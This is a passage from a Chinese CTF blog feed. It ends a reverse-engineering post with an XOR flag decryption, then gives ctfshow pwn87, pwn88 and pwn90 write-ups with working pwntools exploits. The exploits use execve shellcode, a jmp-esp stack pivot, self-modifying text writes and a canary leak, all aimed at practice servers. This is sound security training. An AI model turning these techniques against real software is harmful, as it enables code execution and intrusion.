<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encrypted = <span class="string">&quot;%tp&amp;:&quot;</span></span><br><span class="line">known_plaintext = <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">known_ciphertext = encrypted[-<span class="number">1</span>]  <span class="comment"># &#x27;:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算异或密钥</span></span><br><span class="line">key = <span class="built_in">ord</span>(known_ciphertext) ^ <span class="built_in">ord</span>(known_plaintext)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;找到密钥: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密整个字符串</span></span><br><span class="line">decrypted = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ key) <span class="keyword">for</span> c <span class="keyword">in</span> encrypted)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密后的字符串: <span class="subst">&#123;decrypted&#125;</span>&quot;</span>)    </span><br><span class="line"><span class="comment">#找到密钥: 71</span></span><br><span class="line"><span class="comment">#解密后的字符串: b37a&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;d07abccf8a410cb37a&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>reverse</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>花式栈溢出</title>
    <url>/2025/07/27/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h2 id="pwn87"><a href="#pwn87" class="headerlink" title="pwn87"></a>pwn87</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">28</span>]; <span class="comment">// [esp+8h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> fgets(s, 50, stdin);存在栈溢出漏洞。</p>
<p>50 - 0x20 - 0x04 &#x3D; 14</p>
<p>可利用的空间不足，要利用栈迁移。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary=pwn --only=&#x27;jmp|ret&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~$ ROPgadget --binary=pwn --only=&#x27;jmp|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08048bcf : jmp 0x2825346b</span><br><span class="line">0x080483bb : jmp 0x80483a0</span><br><span class="line">0x08048534 : jmp 0x80484c0</span><br><span class="line">0x08048612 : jmp 0x8048613</span><br><span class="line">0x08048624 : jmp 0x8048625</span><br><span class="line">0x08048636 : jmp 0x8048637</span><br><span class="line">0x0804866c : jmp 0x804866d</span><br><span class="line">0x080485f3 : jmp 0x8c0485f5</span><br><span class="line">0x080485ca : jmp 0xf05585ce</span><br><span class="line">0x080485dc : jmp 0xf05585e0</span><br><span class="line">0x08048d17 : jmp esp</span><br><span class="line">0x0804837a : ret</span><br><span class="line">0x080484ce : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure>

<p>找到0x08048d17 : jmp esp</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接远程服务器</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28287</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置上下文为 32 位（i386）</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 ELF 文件</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 x86 shellcode（注意前面加 b 表示 bytes）</span></span><br><span class="line">shellcode_x86 = (</span><br><span class="line">    <span class="string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 sub esp, 0x28; jmp esp 的机器码</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28; jmp esp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 固定地址（需根据实际程序确认）</span></span><br><span class="line">jmp_esp = <span class="number">0x08048d17</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload</span></span><br><span class="line">payload = shellcode_x86</span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span> * (<span class="number">0x20</span> - <span class="built_in">len</span>(shellcode_x86))  <span class="comment"># 填充到 0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;bbbb&#x27;</span>                             <span class="comment"># ebp</span></span><br><span class="line">payload += p32(jmp_esp)                        <span class="comment"># 覆盖返回地址</span></span><br><span class="line">payload += sub_esp_jmp                         <span class="comment"># 跳转指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互模式</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>解释一下疑惑点，当执行到p32(jmp_esp)；由于函数返回时执行leave ret;leave:pop ebp 是esp会指向ebp + 4 也就是 sub_esp_jmp；然</p>
<p>后esp 转到 esp - 0x28的位置，也就是s的起始位置；jmp esp使得esp指向s的起始位置,ret使得esp指向eip，执行shellcode。</p>
<h2 id="pwn88"><a href="#pwn88" class="headerlink" title="pwn88"></a>pwn88</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v6[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where What?&quot;</span>);</span><br><span class="line">  v5 = __isoc99_scanf(<span class="string">&quot;%llx %d&quot;</span>, v6, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *(_BYTE *)v6[<span class="number">0</span>] = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">0xFF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No flag for you&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到可以用v4来修改v6这个内存地址。</p>
<p>这个只有一次读入肯定是不够的，所以要构造一个循环</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:00000000004006F2                 push    rbp</span><br><span class="line">.text:00000000004006F3                 mov     rbp, rsp</span><br><span class="line">.text:00000000004006F6                 sub     rsp, 20h</span><br><span class="line">.text:00000000004006FA                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000400703                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000400707                 xor     eax, eax</span><br><span class="line">.text:0000000000400709                 mov     rax, cs:__bss_start</span><br><span class="line">.text:0000000000400710                 mov     esi, 0          ; buf</span><br><span class="line">.text:0000000000400715                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000400718                 call    _setbuf</span><br><span class="line">.text:000000000040071D                 mov     edi, offset format ; &quot;Where What?&quot;</span><br><span class="line">.text:0000000000400722                 mov     eax, 0</span><br><span class="line">.text:0000000000400727                 call    _printf</span><br><span class="line">.text:000000000040072C                 lea     rdx, [rbp+var_18]</span><br><span class="line">.text:0000000000400730                 lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000400734                 mov     rsi, rax</span><br><span class="line">.text:0000000000400737                 mov     edi, offset aLlxD ; &quot;%llx %d&quot;</span><br><span class="line">.text:000000000040073C                 mov     eax, 0</span><br><span class="line">.text:0000000000400741                 call    ___isoc99_scanf</span><br><span class="line">.text:0000000000400746                 mov     [rbp+var_14], eax</span><br><span class="line">.text:0000000000400749                 cmp     [rbp+var_14], 2</span><br><span class="line">.text:000000000040074D                 jz      short loc_400756</span><br><span class="line">.text:000000000040074F                 mov     eax, 0</span><br><span class="line">.text:0000000000400754                 jmp     short loc_400778</span><br><span class="line">.text:0000000000400756 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400756</span><br><span class="line">.text:0000000000400756 loc_400756:                             ; CODE XREF: main+5B↑j</span><br><span class="line">.text:0000000000400756                 mov     rax, [rbp+var_10]</span><br><span class="line">.text:000000000040075A                 mov     edx, [rbp+var_18]</span><br><span class="line">.text:000000000040075D                 mov     [rax], dl</span><br><span class="line">.text:000000000040075F                 mov     eax, [rbp+var_18]</span><br><span class="line">.text:0000000000400762                 cmp     eax, 0FFh</span><br><span class="line">.text:0000000000400767                 jnz     short loc_400773</span><br><span class="line">.text:0000000000400769                 mov     edi, offset s   ; &quot;No flag for you&quot;</span><br><span class="line">.text:000000000040076E                 call    _puts</span><br><span class="line">.text:0000000000400773</span><br><span class="line">.text:0000000000400773 loc_400773:                             ; CODE XREF: main+75↑j</span><br><span class="line">.text:0000000000400773                 mov     eax, 0</span><br><span class="line">.text:0000000000400778</span><br><span class="line">.text:0000000000400778 loc_400778:                             ; CODE XREF: main+62↑j</span><br><span class="line">.text:0000000000400778                 mov     rcx, [rbp+var_8]</span><br><span class="line">.text:000000000040077C                 xor     rcx, fs:28h</span><br><span class="line">.text:0000000000400785                 jz      short locret_40078C</span><br><span class="line">.text:0000000000400787                 call    ___stack_chk_fail</span><br><span class="line">.text:000000000040078C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040078C</span><br><span class="line">.text:000000000040078C locret_40078C:                          ; CODE XREF: main+93↑j</span><br><span class="line">.text:000000000040078C                 leave</span><br><span class="line">.text:000000000040078D                 retn</span><br></pre></td></tr></table></figure>



<p>再汇编中我们可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400767                 jnz     short loc_400773；</span><br></pre></td></tr></table></figure>

<p>我们可以利用这个使得其调回到000000000040071D到达printf的地址进行二次输入。第二次输入（修改<code>jnz</code>为<code>jmp</code>）达到无条件转跳，</p>
<p>从而达到循环。</p>
<p>然后利用单字节写入在0x0000000000400769写入shellcode，最后再利用修改jmp转跳到shellcode的地址来执行shellcode。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标程序（根据需求选择一种连接方式）</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="string">&#x27;28194&#x27;</span>)  <span class="comment"># 远程连接</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">text_addr = <span class="number">0x400767</span>  <span class="comment"># 需要修改的关键指令地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">addr, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;向指定地址写入数据（实际只修改最低字节）&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Where What?&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span> <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步：修改跳转偏移（保留原指令结构）</span></span><br><span class="line"><span class="comment"># 将jnz指令的偏移改为0xB6（-0x4A的补码）</span></span><br><span class="line">jnz_offset = u32(asm(<span class="string">&#x27;jnz $-0x4A&#x27;</span>)[<span class="number">1</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">write_data(text_addr + <span class="number">1</span>, jnz_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：修改操作码为jmp（短跳转）</span></span><br><span class="line">jmp_opcode = u32(asm(<span class="string">&#x27;jmp $-0x4A&#x27;</span>)[<span class="number">0</span>:<span class="number">1</span>].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">write_data(text_addr, jmp_opcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三步：在text+2位置注入shellcode</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x68732f6e69622f  # &quot;/bin/sh&quot;的十六进制</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp     # 文件名参数</span></span><br><span class="line"><span class="string">    mov rax, 59      # execve系统调用号</span></span><br><span class="line"><span class="string">    xor rsi, rsi     # argv = NULL</span></span><br><span class="line"><span class="string">    xor rdx, rdx     # envp = NULL</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_addr = text_addr + <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(shellcode):</span><br><span class="line">    write_data(shellcode_addr + i, byte)  <span class="comment"># 逐字节写入shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第四步：修正跳转偏移为+2（指向shellcode起始位置）</span></span><br><span class="line">corrected_offset = u32(asm(<span class="string">&#x27;jnz $+0x2&#x27;</span>)[<span class="number">1</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">write_data(text_addr + <span class="number">1</span>, corrected_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取交互式shell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn89"><a href="#pwn89" class="headerlink" title="pwn89"></a>pwn89</h2><p>这题我写在[canary](<a href="https://linkpwn.github.io/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/#%E8%A6%86%E7%9B%96TCB%E6%9D%A5%E5%AE%9E%E7%8E%B0%E5%AF%B9canary%E7%9A%84%E7%BB%95%E8%BF%87">pwn各类题型总结 | 网络幻影</a>)这块</p>
<h2 id="pwn-90"><a href="#pwn-90" class="headerlink" title="pwn 90"></a>pwn 90</h2><p>利用第一个read和printf泄露canary</p>
<p>再利用栈溢出将返回地址的最低位覆盖成后门地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28145</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收欢迎消息</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Welcome CTFshow:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造第一个payload：40字节填充 + 1字节覆盖Canary最低位</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span> + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收数据直到 &#x27;Hello &#x27; 后的内容</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Hello &#x27;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">b&#x27;:\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;Received data length: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">48</span>:</span><br><span class="line">    log.error(<span class="string">&quot;Did not receive enough data&quot;</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取 Canary</span></span><br><span class="line">canary_leaked = data[<span class="number">41</span>:<span class="number">48</span>]       <span class="comment"># 我们发的 B 后面7字节</span></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span> + canary_leaked  <span class="comment"># Canary 高位补 \x00</span></span><br><span class="line">canary_val = u64(canary.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;Leaked canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary_val)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造第二个payload</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span> + p64(canary_val) + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x3f&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试查看payload</span></span><br><span class="line"><span class="comment">#log.info(&quot;Payload2 dump:&quot;)</span></span><br><span class="line"><span class="comment">#print(hexdump(payload2))</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment"># 交互模式</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
      </categories>
  </entry>
</search>
